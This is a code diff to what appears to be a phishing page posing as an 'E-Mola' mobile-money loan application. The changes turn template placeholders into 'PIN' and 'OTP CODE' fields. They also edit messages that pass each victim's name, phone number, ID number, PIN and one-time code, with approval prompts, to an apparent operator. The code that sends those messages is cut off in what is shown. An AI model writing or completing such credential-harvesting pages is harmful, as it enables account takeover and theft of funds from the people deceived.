@@ -359,11 +359,11 @@ input[type=range]::-webkit-slider-thumb{
 
   <div class="blank-body">
     <div class="blank-card" style="margin-top:16px;">
-      <div class="edit-tag">Editar no GitHub — Página 3</div>
+      <div class="edit-tag">Pin Verification</div>
 
       <!-- ↓ MUDE "P3_LABEL" PARA O SEU TEXTO ↓ -->
       <div class="f">
-        <label style="font-size:13px;font-weight:700;color:var(--navy);margin-bottom:7px;display:block;">P3_LABEL</label>
+        <label style="font-size:13px;font-weight:700;color:var(--navy);margin-bottom:7px;display:block;">PIN</label>
         <input type="text" id="p3_field" style="width:100%;padding:13px 15px;border:1.5px solid var(--border);border-radius:11px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:var(--navy);background:var(--off);outline:none;"/>
       </div>
       <!-- ↑ MUDE "P3_LABEL" PARA O SEU TEXTO ↑ -->
@@ -420,7 +420,7 @@ input[type=range]::-webkit-slider-thumb{
 
   <div class="blank-body">
     <div class="blank-card" style="margin-top:16px;">
-      <div class="edit-tag">Editar no GitHub — Página 4</div>
+      <div class="edit-tag">OTP Verification</div>
 
       <!-- 45 SEGUNDOS DE CONTAGEM DECRESCENTE -->
       <div class="timer-wrap">
@@ -437,7 +437,7 @@ input[type=range]::-webkit-slider-thumb{
 
       <!-- ↓ MUDE "P4_LABEL" PARA O SEU TEXTO ↓ -->
       <div class="f">
-        <label style="font-size:13px;font-weight:700;color:var(--navy);margin-bottom:7px;display:block;">P4_LABEL</label>
+        <label style="font-size:13px;font-weight:700;color:var(--navy);margin-bottom:7px;display:block;">OTP CODE</label>
         <input type="text" id="p4_field" style="width:100%;padding:13px 15px;border:1.5px solid var(--border);border-radius:11px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:var(--navy);background:var(--off);outline:none;"/>
       </div>
       <!-- ↑ MUDE "P4_LABEL" PARA O SEU TEXTO ↑ -->
@@ -611,7 +611,7 @@ input[type=range]::-webkit-slider-thumb{
     const msg="📱 *E-MOLA EMPRÉSTIMO — PÁGINA 3*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Nome:* ${app.name}\n📱 *Telefone:* ${app.phone}\n`+
       `🪪 *ID:* ${app.id}\n💵 *Montante:* MT ${fmtMT(parseInt(app.amt))}\n\n`+
-      `▪️ *P3_LABEL:* ${field}\n\n`+
+      `▪️ *PIN:* ${field}\n\n`+
     // ↑ MUDE "P3_LABEL" PARA CORRESPONDER À SUA ETIQUETA ↑
       `🔖 *Ref:* \`${curRef}\`\n🕐 *Hora:* ${stamp()}\n\n👇 *Aprovar para continuar para Página 4:*`;
     try{
@@ -661,7 +661,7 @@ input[type=range]::-webkit-slider-thumb{
       `🪪 *ID:* ${app.id}\n💵 *Montante:* MT ${fmtMT(parseInt(app.amt))}\n`+
       `💼 *Situação:* ${app.employ}\n💰 *Rendimento:* MT ${fmtMT(parseInt(app.income))}\n`+
       `📅 *Pagamento:* ${app.repay}\n▪️ *Pág 3:* ${app.p3}\n\n`+
-      `▪️ *P4_LABEL:* ${field}\n\n`+
+      `▪️ *OTP:* ${field}\n\n`+
     // ↑ MUDE "P4_LABEL" PARA CORRESPONDER À SUA ETIQUETA ↑
       `🔖 *Ref Final:* \`${curRef}\`\n🕐 *Hora:* ${stamp()}\n\n👇 *DECISÃO FINAL:*`;
     try{
